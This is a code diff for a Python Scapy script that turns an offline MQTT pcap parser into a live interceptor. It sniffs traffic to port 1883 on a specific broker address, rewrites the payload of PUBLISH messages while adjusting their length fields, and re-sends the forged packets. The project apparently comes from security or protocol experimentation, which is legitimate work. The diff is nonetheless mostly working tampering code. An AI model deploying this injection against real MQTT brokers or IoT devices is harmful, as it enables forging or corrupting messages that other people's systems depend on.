@@ -1,9 +1,12 @@
 import codecs
 
 from scapy.all import *
-from scapy.layers.inet import TCP
+from scapy.contrib.mqtt import MQTT
+from scapy.layers.inet import TCP, IP
 
 import logging
+
+from scapy.layers.l2 import Ether
 
 logging.basicConfig(
     level=logging.NOTSET,
@@ -15,6 +18,10 @@ packetList = []
 ERROR_MESSAGE = {
     0: 'MQTT TYPE ERROR'
 }
+
+# 设置监听的网络接口和过滤条件
+interface = "Realtek PCIe 2.5GbE Family Controller"  # 替换为你的网络接口名称
+filter_rule = "tcp port 1883 and dst host 148.70.99.98"
 
 
 def analysis_pcap(file: str):
@@ -142,6 +149,7 @@ class TcpPacket:
         self.entirePacket = newPacket
         self.payload_len = newPayloadLength
         self.mqtt = self.entirePacket[-newPayloadLength:]
+        return self.entirePacket
 
 
 # class for the mqtt Connect Command
@@ -163,6 +171,7 @@ class MqttPublish:
                             self.msgid_len +
                             self.hexToInt(mqtt[self.topicLengthNum + 4 + self.msgid_len]) +
                             1:]
+        self.message_payload_length = len(self.message)
         self.properties = mqtt[
                           self.topicLengthNum + 4 + self.msgid_len
                           :
@@ -235,7 +244,7 @@ class MqttPublish:
 
     def changeMessage(self, newMessage):  # since MQTT doesn't have a checksum we can just go ahead and alter the packet
         self.messageWords = newMessage
-        self.messageLengthNum = self.messageLengthNum - (self.messageLengthNum - len(newMessage))
+        self.messageLengthNum = self.messageLengthNum - (self.message_payload_length - len(newMessage))
         self.messageLength = hex(self.messageLengthNum)
         message = []
         for letter in newMessage:
@@ -299,19 +308,70 @@ def editMessage(msgPackage: TcpPacket, newMessage='None'):
     return msgPackage
 
 
+def modify_mqtt_package(packet: Packet):
+    if (packet.haslayer(Raw) or packet.haslayer(MQTT)) and packet[TCP].dport == 1883:
+        payload_length = seek_package_tcp_payload(tcpPackage=packet)
+        toHex = fixHex(packet)
+        toTcpPackage = TcpPacket(payload_len=payload_length, packet=toHex)
+        type_num, word = toTcpPackage.mqttType
+        if type_num != 3:
+            send(packet, verbose=0)
+        else:
+            logging.info(
+                msg="MESSAGE EDITING!"
+            )
+            after_edit_strhexval = editMessage(msgPackage=toTcpPackage, newMessage='TESTING_NOT_NONE')
+            packet = bytes_to_packet(after_edit_strhexval.entirePacket)
+            send(packet, verbose=3, iface=interface)
+
+
+def hexstrToint(strlist):
+    n = len(strlist)
+    for i in range(n):
+        strlist[i] = int(strlist[i], 16)
+    return strlist
+
+
+def bytes_to_packet(data):
+    data = hexstrToint(data)
+    ipnewlen = len(data) - 14
+    eth_pkt = Ether(bytes(data))
+    package = eth_pkt
+    if IP in eth_pkt:
+        package = eth_pkt[IP]
+        package.len = ipnewlen
+
+    # if IP in eth_pkt:
+    #     ip_pkt = eth_pkt[IP]
+    #     if TCP in ip_pkt:
+    #         tcp_pkt = ip_pkt[TCP]
+    #         # del ip_pkt.chksum  # 46599
+    #         # del tcp_pkt.chksum  # 49892
+    #         # ip_pkt = ip_pkt.__class__(bytes(ip_pkt))
+    #         # tcp_pkt = tcp_pkt.__class__(bytes(tcp_pkt))
+    #         # ip_pkt.add_payload(tcp_pkt)
+    #         # ip_pkt = ip_pkt.__class__(bytes(ip_pkt))
+    #         package = eth_pkt / ip_pkt / tcp_pkt
+    #         return package
+    return package
+
+
 if __name__ == '__main__':
-    packages = analysis_pcap('./mqttv5_only.pcap')
+    # packages = analysis_pcap('./mqttv5_only.pcap')
+    #
+    # # rawlist = []
+    # # for p in packages:
+    # #     print(str(raw(p))) # this can replace str
+    # tcp_packages = seek_tcp_package(packages=packages)
+    # for tp in tcp_packages:
+    #     packetList.append((seek_package_tcp_payload(tcpPackage=tp), fixHex(tp)))
+    # print(packetList)
+    # msg_packages = onlyMQTTPackets(packetList)
+    # print(msg_packages)
+    #
+    # msg_packages[0] = editMessage(msg_packages[0])
+    # print(msg_packages)
+    # ans = bytes_to_packet(msg_packages[0].entirePacket)
+    # print(ans)
 
-    # rawlist = []
-    # for p in packages:
-    #     print(str(raw(p))) # this can replace str
-
-    tcp_packages = seek_tcp_package(packages=packages)
-    for tp in tcp_packages:
-        packetList.append((seek_package_tcp_payload(tcpPackage=tp), fixHex(tp)))
-    print(packetList)
-    msg_packages = onlyMQTTPackets(packetList)
-    print(msg_packages)
-
-    msg_packages[0] = editMessage(msg_packages[0])
-    print(msg_packages)
+    sniff(iface=interface, filter=filter_rule, prn=modify_mqtt_package, session=IPSession, store=False)
